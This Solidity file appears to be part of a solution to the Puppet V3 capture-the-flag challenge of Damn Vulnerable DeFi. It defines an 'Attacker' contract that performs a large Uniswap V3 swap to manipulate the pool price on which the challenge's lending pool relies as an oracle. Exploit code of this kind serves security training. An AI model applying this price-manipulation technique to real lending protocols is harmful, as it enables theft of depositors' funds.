// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3SwapCallback} from '@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol';
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

contract Attacker {

    IUniswapV3Pool uniswapPool;
    DamnValuableToken token;
    PuppetV3Pool lendingPool;
    WETH weth;
    address player;
    
    constructor(PuppetV3Pool _lendingPool, IUniswapV3Pool _uniswapPool, DamnValuableToken _token, WETH _weth, address _player) {
        uniswapPool = _uniswapPool;
        lendingPool = _lendingPool;
        token = _token;
        weth = _weth;
        player = _player;
    }

    function attack(int256 amount) external {
        uniswapPool.swap(player, true, amount, TickMath.MIN_SQRT_RATIO + 1, "");   
    }

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
        if (amount0 > 0) {
            token.transfer(address(uniswapPool), uint256(amount0));
        } 

        if (amount1 > 0) {
            weth.transfer(address(uniswapPool), uint256(amount1));
        }
    }


}